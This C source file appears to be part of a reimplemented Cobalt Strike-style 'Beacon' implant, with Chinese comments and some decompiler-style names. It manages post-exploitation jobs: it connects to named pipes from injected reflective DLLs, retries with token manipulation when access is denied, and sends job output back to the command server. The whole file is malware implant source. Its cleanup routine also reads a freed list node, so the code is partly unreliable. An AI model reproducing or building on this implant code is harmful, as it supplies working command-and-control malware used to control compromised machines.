#include "BeaconJob.h"
#include "ChildBeacon.h"


int g_job_Number;
BeaconJob* gBeaconJob;
BOOL ConnectPipe(int dwFlagsAndAttributes, HANDLE* hNamedPipe, LPCSTR lpNamedPipeName)
{
	HANDLE i;
	DWORD Mode;
	dwFlagsAndAttributes = dwFlagsAndAttributes | 0x100000;
	for (i = CreateFileA(lpNamedPipeName, GENERIC_READ | GENERIC_WRITE, 0, 0, 3u, dwFlagsAndAttributes | 0x100000, 0);
		;
		i = CreateFileA(lpNamedPipeName, GENERIC_READ | GENERIC_WRITE, 0, 0, 3u, dwFlagsAndAttributes, 0))
	{
		*hNamedPipe = i;
		if (i != (HANDLE)-1)
		{
			break;
		}
		if (GetLastError() != 231)
		{
			return 0;
		}
		if (!WaitNamedPipeA(lpNamedPipeName, 0x2710))
		{
			SetLastError(0x102);
			return 0;
		}
	}
	Mode = 0;
	if (SetNamedPipeHandleState(*hNamedPipe, &Mode, 0, 0))
	{
		return 1;
	}
	DisconnectNamedPipe(*hNamedPipe);
	CloseHandle(*hNamedPipe);
	return 0;
}


//************************************
// Method:    ConnectJobPipe
// FullName:  ConnectJobPipe
// Access:    public 
// Returns:   BOOL
// Qualifier:连接到反射dll创建的命名管道
// Parameter: HANDLE * hNamedPipe
// Parameter: int dwFlagsAndAttributes
// Parameter: CHAR * NamedPipeName
//************************************
BOOL ConnectJobPipe(HANDLE* hNamedPipe, int dwFlagsAndAttributes, CHAR* NamedPipeName)
{
	if (dwFlagsAndAttributes)
	{
		return ConnectPipe(dwFlagsAndAttributes, hNamedPipe, NamedPipeName);
	}
	BOOL ret = ConnectPipe(0, hNamedPipe, NamedPipeName);
	if (!ret && GetLastError() == 5)
	{
		close_token_fake();
		ret = ConnectPipe(0, hNamedPipe, NamedPipeName);
		restore_token_fake();
	}
	return ret;
}

void CheckTimeout(HANDLE hNamedPipe, int timeout)
{
	DWORD TotalBytesAvail = 0;
	int time = timeout + GetTickCount();
	while (GetTickCount() < time && PeekNamedPipe(hNamedPipe, 0, 0, 0, &TotalBytesAvail, 0) && !TotalBytesAvail)
	{
		Sleep(500);
	}
}


void Add_Beacon_Job(BeaconJob* pBeaconJob)
{
	pBeaconJob->JobNumber = g_job_Number;
	++g_job_Number;
	BeaconJob* pgBeaconJob = gBeaconJob;
	BeaconJob* temp;
	if (pgBeaconJob)
	{
		do
		{
			temp = pgBeaconJob;
			pgBeaconJob = pgBeaconJob->Linked;
		} while (pgBeaconJob);
		temp->Linked = pBeaconJob;
	}
	else
	{
		gBeaconJob = pBeaconJob;
	}
}

void Add_BeaconInternal_Job(HANDLE hNamedPipe, int job_process_pid, int job_type, char* job_name, int lasting)
{
	BeaconJob* psshBeaconJob = (BeaconJob*)malloc(sizeof(BeaconJob));
	psshBeaconJob->hWritePipe = (HANDLE)-1;
	psshBeaconJob->Linked = 0;
	psshBeaconJob->hReadPipe = hNamedPipe;
	psshBeaconJob->state = 1;
	psshBeaconJob->kill = 0;
	psshBeaconJob->JobProcessPid = job_process_pid;
	psshBeaconJob->JobType = job_type;
	psshBeaconJob->lasting = lasting;
	strncpy(psshBeaconJob->JobName, job_name, JobNameMAX);
	Add_Beacon_Job(psshBeaconJob);
}

void BeaconBackstageJob(int FlagsAndAttributes, char* Taskdata, int Task_size, int lasting)
{
	char job_name[64] = { 0 };
	CHAR NamedPipeName[64] = { 0 };
	HANDLE hNamedPipe;
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	int job_process_pid = BeaconDataInt(&pdatap);
	int job_type = BeaconDataShort(&pdatap);
	int timeout = BeaconDataShort(&pdatap);
	if (BeaconDataCopyToBuffer(&pdatap, NamedPipeName, 64) && BeaconDataCopyToBuffer(&pdatap, job_name, 64))
	{
		int dwFlagsAndAttributes = FlagsAndAttributes != 0 ? 0x20000 : 0;
		int number = 0;
		//连接到job任务的命名管道
		while (!ConnectJobPipe(&hNamedPipe, dwFlagsAndAttributes, NamedPipeName))
		{
			Sleep(500);
			if (++number >= 20)
			{
				BeaconErrorD(20, GetLastError());
				return;
			}
		}
		if (timeout)
		{
			CheckTimeout(hNamedPipe, timeout);
		}
		Add_BeaconInternal_Job(hNamedPipe, job_process_pid, job_type, job_name, lasting);
	}
}

/// <summary>
/// Beacon list jobs
/// </summary>
void beacon_jobs()
{
	BeaconJob* pBeaconJob = gBeaconJob;
	formatp pformatp;
	BeaconFormatAlloc(&pformatp, 0x8000);
	while (pBeaconJob)
	{
		BeaconFormatPrintf(&pformatp, (char*)"%d\t%d\t%s\n", pBeaconJob->JobNumber, pBeaconJob->JobProcessPid, pBeaconJob->JobName);
		pBeaconJob = pBeaconJob->Linked;
	}
	int length = BeaconFormatlength(&pformatp);
	char* buffer = BeaconFormatOriginalPtr(&pformatp);
	BeaconTaskOutput(buffer, length, 0x14);
	BeaconFormatFree(&pformatp);
}

/// <summary>
/// 对beacon jos进行清理,删除停止状态的任务
/// </summary>
void del_beacon_job()
{
	BeaconJob* pgBeaconJob = gBeaconJob;
	if (pgBeaconJob)
	{
		do
		{
			if (pgBeaconJob->kill == 1)
			{
				if (pgBeaconJob->state)
				{
					if (pgBeaconJob->state == 1)
					{
						DisconnectNamedPipe(pgBeaconJob->hReadPipe);
						CloseHandle(pgBeaconJob->hReadPipe);
					}
				}
				else
				{
					CloseHandle(pgBeaconJob->pHandle);
					CloseHandle(pgBeaconJob->hThread);
					CloseHandle(pgBeaconJob->hReadPipe);
					CloseHandle(pgBeaconJob->hWritePipe);
				}
			}
			pgBeaconJob = pgBeaconJob->Linked;
		} while (pgBeaconJob);
		
	}
	pgBeaconJob = gBeaconJob;
	BeaconJob* temp = 0;
	while (pgBeaconJob)
	{
		if (pgBeaconJob->kill == 1)
		{
			if (temp)
			{
				temp->Linked = pgBeaconJob->Linked;
				free(pgBeaconJob);
				pgBeaconJob = pgBeaconJob->Linked;
			}
			else
			{
				gBeaconJob = pgBeaconJob->Linked;
				BeaconJob* temp1 = gBeaconJob;
				free(pgBeaconJob);
				pgBeaconJob = temp1;
			}
		}
		else
		{
			temp = pgBeaconJob;
			pgBeaconJob = pgBeaconJob->Linked;
		}
	}
}

void beacon_JobKill(char* Taskdata, int Task_size)
{
	BeaconJob* pBeaconJob = gBeaconJob;
	datap pdatap;
	BeaconDataParse(&pdatap, Taskdata, Task_size);
	int jobid = BeaconDataShort(&pdatap);
	while (pBeaconJob)
	{
		if (pBeaconJob->JobNumber == jobid)
		{
			pBeaconJob->kill = 1;
		}
		pBeaconJob = pBeaconJob->Linked;
	}
	del_beacon_job();
}

BeaconJob* Add_Beacon_0Job(HANDLE hProcess,HANDLE hThread,int dwProcessId,int dwThreadId,HANDLE hReadPipe,HANDLE hWritePipe,const char* jobname)
{
	BeaconJob* pBeaconJob = (BeaconJob*)malloc(sizeof(BeaconJob));
	pBeaconJob->pHandle = hProcess;
	pBeaconJob->hThread = hThread;
	pBeaconJob->dwProcessId = dwProcessId;
	pBeaconJob->dwThreadId = dwThreadId;
	pBeaconJob->Linked = 0;
	pBeaconJob->hReadPipe = hReadPipe;
	pBeaconJob->hWritePipe = hWritePipe;
	pBeaconJob->state = 0;
	pBeaconJob->kill = 0;
	pBeaconJob->JobType = 0;
	pBeaconJob->JobProcessPid = dwProcessId;
	pBeaconJob->lasting = 0;
	_snprintf(pBeaconJob->JobName, 0x40u, "%s", jobname);
	Add_Beacon_Job(pBeaconJob);
	return pBeaconJob;
}

int ReadPipeData(HANDLE hNamedPipe, char* buffer)
{
	DWORD TotalBytesAvail;
	if (!PeekNamedPipe(hNamedPipe, 0, 0, 0, &TotalBytesAvail, 0))
	{
		return -1;
	}
	if (!TotalBytesAvail)
	{
		return 0;
	}
	int size;
	if (RecvSmbData(hNamedPipe,(char*)&size, 4) == 4 && size <= 0x80000)
	{
		return RecvSmbData(hNamedPipe, buffer, size);
	}
	return -1;
}
DWORD sub_10005837(HANDLE hNamedPipe, char* lpBuffer)
{
	DWORD NumberOfBytesRead = 0;
	DWORD TotalBytesAvail;
	int size=0;
	while (1)
	{
		if (!PeekNamedPipe(hNamedPipe, 0, 0, 0, &TotalBytesAvail, 0))
		{
			return -1;
		}
		if (!TotalBytesAvail || size >= 0x80000)
		{
			break;
		}
		ReadFile(hNamedPipe, lpBuffer, 0x80000 - size, &NumberOfBytesRead, 0);
		size += NumberOfBytesRead;
		lpBuffer += NumberOfBytesRead;
	}
	return NumberOfBytesRead;
}


//************************************
// Method:    CheckJobOutput
// FullName:  CheckJobOutput
// Access:    public 
// Returns:   void
// Qualifier:检查job任务命名管道是否有输出如果有则返回给server
//************************************
void CheckJobOutput()
{
	BeaconJob* pgBeaconJob = gBeaconJob;
	if (pgBeaconJob)
	{
		char* read_data = (char*)malloc(0x80000u);
		int read_size;
		do
		{
			HANDLE hReadPipe = pgBeaconJob->hReadPipe;
			if (pgBeaconJob->lasting == 1)
			{
				read_size = ReadPipeData(hReadPipe, read_data);
			}
			else
			{
				read_size = sub_10005837(hReadPipe, read_data);
			}
			if (read_size > 0)
			{
				BeaconTaskOutput(read_data, read_size, pgBeaconJob->JobType);
			}
			if (pgBeaconJob->state == 1 && read_size == -1 || !pgBeaconJob->state && WaitForSingleObject(pgBeaconJob->pHandle, 0) != 0x102)
			{
				pgBeaconJob->kill = 1;
			}
			if (pgBeaconJob->lasting != 1 || read_size <= 0)
			{
				pgBeaconJob = pgBeaconJob->Linked;
			}
		} while (pgBeaconJob);
		memset(read_data, 0, 0x80000);
		free(read_data);
		del_beacon_job();
	}
}